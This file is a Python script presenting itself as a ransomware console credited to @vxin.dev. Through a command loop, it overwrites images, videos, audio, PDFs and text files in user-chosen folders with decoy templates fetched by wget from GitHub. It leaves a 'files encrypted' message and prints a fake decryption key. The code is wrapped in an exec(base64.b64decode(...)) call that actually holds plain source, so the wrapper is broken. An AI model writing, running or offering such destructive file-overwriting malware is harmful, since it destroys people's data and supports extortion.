#!/bin/python
#coding: utf-8

import base64
exec(base64.b64decode(b'#!/bin/python
#coding: utf-8

import os, sys, time, datetime, json, shutil, hashlib, random, base64, readline

array = []

class auto(object):
	def __init__(self, options):
		self.options = sorted(options)
	
	def complete(self, text, state):
		if state == 0:
			if text:
				self.matches = [s for s in self.options if s and s.startswith(text)]
			else:
				self.matches = self.options[:]
		try:
			return self.matches[state]
		except IndexError:
			return None

def complete(array):
	completer = auto(array)
	readline.set_completer(completer.complete)
	readline.parse_and_bind('tab:complete')

def loadingScreen(msg, msgIfDone = "    "):
	bars = [
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} .   -",
		f"[*] {msg} ..  |",
		f"[*] {msg} ... \\",
		f"[*] {msg} .   /",
		f"[*] {msg} ... {msgIfDone}"
	]
	for i in range(len(bars)):
		time.sleep(1./random.randint(1, 10))
		sys.stdout.write(f"\r{bars[i]}")
		sys.stdout.flush()
	print("")
	time.sleep(2)

banner = """
  ___  ___  _ _  ___  ___  __ __  ___  _ _ _  ___  ___  ___ 
 | . \| . || \ |/ __>| . ||  \  \| __>| | | || . || . \| __>
 |   /|   ||   |\__ \| | ||     || _> | | | ||   ||   /| _> 
 |_\_\|_|_||_\_|<___/`___'|_|_|_||___>|__/_/ |_|_||_\_\|___>
    Code by @vxin.dev      [ python ]     version 1.5-dev
"""

def startBanner():
	print(banner)

if os.path.exists(".ransomeware"):
	pass
else:
	os.mkdir(".ransomeware")
	open(".ransomeware/.paths.json", "w").write(json.dumps({
		"paths": []
	}, indent=4))
	
	if os.path.exists("assets/templates"):
		pass
	else:
		os.makedirs("assets/templates")
		os.system("wget -O assets/templates/template.jpg.encrypt https://github.com/vHacks-development/templates/raw/main/template.jpg.encrypt >> .ransomeware/.ransomeware.log")
		os.system("wget -O assets/templates/template.mp4.encrypt https://github.com/vHacks-development/templates/raw/main/template.mp4.encrypt >> .ransomeware/.ransomeware.log")
		os.system("wget -O assets/templates/template.pdf.encrypt https://github.com/vHacks-development/templates/raw/main/template.pdf.encrypt >> .ransomeware/.ransomeware.log")
		os.system("wget -O assets/templates/template.mp3.encrypt https://github.com/vHacks-development/templates/raw/main/template.mp3.encrypt >> .ransomeware/.ransomeware.log")

templateJpg = base64.b64decode(open("assets/templates/template.jpg.encrypt", "rb").read())
templateMp4 = base64.b64decode(open("assets/templates/template.mp4.encrypt", "rb").read())
templatePdf = base64.b64decode(open("assets/templates/template.pdf.encrypt", "rb").read())
templateMp3 = base64.b64decode(open("assets/templates/template.mp3.encrypt", "rb").read())
templateTxt = "Your files have been encrypted by Mr.Xin"

time.sleep(2)
print("\033[H\033[J")
startBanner()

def ransomewareHelp():
	print("")
	print("CORE COMMANDS")
	print("=============")
	print("")
	print("\tCommand     Description")
	print("\t-------     -----------")
	print("\tadd         Add the folder to the folder list")
	print("\tdel         Remove the folder from the folder list")
	print("\tinfo        View the list of folders")
	print("\tencrypt     Run the virus and start file encryption")
	print("")

while True:
	try:
		prompt = input("ransomeware > ").split()
		if prompt[0] == "help" or prompt[0] == "?":
			ransomewareHelp()
		elif prompt[0] == "add":
			print("")
			try:
				prompt.remove(prompt[0])
				namePath = " ".join(prompt)
				if os.path.exists(namePath):
					f = json.loads(open(".ransomeware/.paths.json", "r").read())
					if f"'{namePath}'" in str(f["paths"]):
						print("[*] This folder already exists")
					else:
						f["paths"].append(namePath)
						open(".ransomeware/.paths.json", "w").write(json.dumps(f, indent=4))
						print(f"[*] The {namePath} folder has been added to the list")
				else:
					print(f"[*] The {namePath} folder cannot be added")
			except IndexError: 
				print("[*] Please enter the name of the folder you want to add")
			print("")
		elif prompt[0] == "del":
			print("")
			if prompt[1] == "all":
				open(".ransomeware/.paths.json", "w").write(json.dumps({
					"paths": []
				}, indent=4))
				print("[*] All folders have been removed from the list")
			else:
				try:
					prompt.remove(prompt[0])
					newPath = " ".join(prompt)
					f = json.loads(open(".ransomeware/.paths.json", "r").read())
					if f"'{newPath}'" in str(f["paths"]):
						f["paths"].remove(newPath)
						open(".ransomeware/.paths.json", "w").write(json.dumps(f, indent=4))
						print(f"The {newPath} folder has been removed from the list")
					else:
						print(f"[*] The {newPath} folder is not in the list")
				except IndexError:
					print("[*] Please enter the name of the folder you want to delete")
			print("")
		elif prompt[0] == "info":
			print("")
			f = json.loads(open(".ransomeware/.paths.json", "r").read())["paths"]
			print("[*] List the folders you want to encrypt\n")
			totalFolder = 0
			for path in f:
				print(f"  ~ {path}")
				totalFolder += 1
			print("")
			print(f"{totalFolder} Folders listed")
			print("")
		elif prompt[0] == "encrypt":
			#Start encrypt
			print("")
			loadingScreen("Start encrypting")
			if os.path.exists(".ransomeware/.decrypt.key"):
				print("[*] You can't encrypt")
			else:
				num = 0
				loadingScreen("Encrypt all files")
				for path in json.loads(open(".ransomeware/.paths.json", "r").read())["paths"]:
					if os.path.exists(path):
						try:
							os.makedirs(f".ransomeware/.save/{path}")
						except FileExistsError:
							pass
						for file in os.listdir(path):
							if file[-4:] == ".jpg" or file[-4:] == ".png" or file[-5:] == ".jpeg":
								f = open(f"{path}/{file}", "rb")
								open(f".ransomeware/.save/{path}/{file}.encrypt", "wb").write(base64.b64encode(f.read()))
								open(f"{path}/{file}", "wb").write(templateJpg)
								num += 1
							elif file[-4:] == ".mp4":
								f = open(f"{path}/{file}", "rb")
								open(f".ransomeware/.save/{path}/{file}.encrypt", "wb").write(base64.b64encode(f.read()))
								open(f"{path}/{file}", "wb").write(templateMp4)
								num += 1
							elif file[-4:] == ".mp3":
								f = open(f"{path}/{file}", "rb")
								open(f".ransomeware/.save/{path}/{file}.encrypt", "wb").write(base64.b64encode(f.read()))
								open(f"{path}/{file}", "wb").write(templateMp3)
								num += 1
							elif file[-4:] == ".pdf":
								f = open(f"{path}/{file}", "rb")
								open(f".ransomeware/.save/{path}/{file}.encrypt", "wb").write(base64.b64encode(f.read()))
								open(f"{path}/{file}", "wb").write(templatePdf)
								num += 1
							elif file[-4:] == ".txt":
								f = open(f"{path}/{file}", "r")
								open(f".ransomeware/.save/{path}/{file}.encrypt", "wb").write(base64.b64encode(f.read().encode("utf-8")))
								open(f"{path}/{file}", "w").write(templateTxt)
								num += 1
					else:
						pass
				genKey = hashlib.sha256(f"Hacked By @Vxin.Dev ^_^ - Code: {random.randint(200, 404)}".encode("utf-8")).hexdigest()
				open(".ransomeware/.decrypt.key", "w").write(json.dumps({
					"key": genKey
				}, indent=2))
				os.system(f"zip -r .ransomeware/.save/ransomeware_{datetime.datetime.now().strftime('%d-%m-%y-%H%M%S')}.zip .ransomeware/.save/sdcard >> .ransomeware/.ransomeware.log")
				
				#Message When Done Encrypt
				print("\033[A[*] Encrypt all files ... done")
				print(f"[*] {num} Files have been encrypted")
				print(f"[*] Key to decrypt: {genKey}")
			print("")
		else:
			print(f"[*] Command not found: {prompt[0]}")
	except IndexError:
		pass
	except KeyboardInterrupt: 
		print("\n[*] Exit the console\n")
		break'))